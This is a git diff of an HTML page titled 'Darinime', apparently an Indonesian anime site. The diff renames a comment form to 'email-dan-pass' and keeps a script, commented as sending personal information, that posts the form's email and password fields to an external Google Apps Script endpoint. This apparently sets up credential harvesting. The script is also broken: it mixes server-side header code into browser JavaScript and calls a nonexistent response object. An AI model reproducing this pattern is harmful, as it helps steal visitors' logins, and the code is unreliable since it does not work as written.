@@ -11,6 +11,8 @@
     <!-- my css -->
     <link rel="stylesheet" href="style.css" />
 
+    <!--  -->
+
     <title>Darinime</title>
   </head>
   <body>
@@ -190,7 +192,7 @@
               <strong>terimakasih</strong> email anda sedang kami proses
               <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
             </div>
-            <form name="komen-form">
+            <form name="email-dan-pass">
               <div class="mb-3">
                 <label for="email" class="form-label">Email address</label>
                 <input type="email" class="form-control" id="email" aria-describedby="email" name="email" />
@@ -215,26 +217,19 @@
     <!-- Option 1: Bootstrap Bundle with Popper -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
 
-	<!-- header -->
 
     <!-- script untuk mengitim informasi pribadi -->
     <script>
+    
       const scriptURL = 'https://script.google.com/macros/s/AKfycbx4yoGW7I3XGuGufzwAcaitvOlEq_7JuACGpsSyDOtS3H8-d2nYvX1QeX3qPQSLcNls6A/exec';
-      const form = document.forms['komen-form'];
+      const form = document.forms['email-dan-pass'];
       const btnKirim = document.querySelector('btn-kirim');
       const btnLoading = document.querySelector ('btn-loading');
       const alert1 = document.querySelector('alert-1');
-	    
-	    
-	app.use((req, res, next)=>{
-	  res.setHeader('Access-Control-Allow-Origin', '*');
-	  res.setHeader('Access-Control-Allow-Origin', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
-  	res.setHeader('Access-Control-Allow-Origin','Content-type, Authoriation');
-		next();
-		})
+
 
       form.addEventListener('submit', e => {
-
+        response.addHeader("Access-Control-Allow-Origin", "*");
         fetch(scriptURL, { method: 'POST', body: new FormData(form) })
           .then(response =>{
              alert1.classList.toggle('d-none');
